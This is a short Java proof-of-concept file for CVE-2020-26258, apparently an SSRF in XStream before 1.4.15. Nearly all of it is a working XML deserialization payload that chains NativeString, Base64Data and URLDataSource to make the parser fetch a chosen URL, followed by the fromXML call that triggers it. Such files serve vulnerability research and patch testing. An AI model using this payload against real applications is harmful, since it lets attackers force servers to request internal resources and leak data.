package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * @author Whoopsunix
 * XStream < 1.4.15 SSRF漏洞
 */
public class CVE_2020_26258 {
    public static void main(String[] args) {
        String payload = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='javax.activation.URLDataSource'>\n" +
                "            <url>http://127.0.0.1:8000/ntuser.ini</url>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
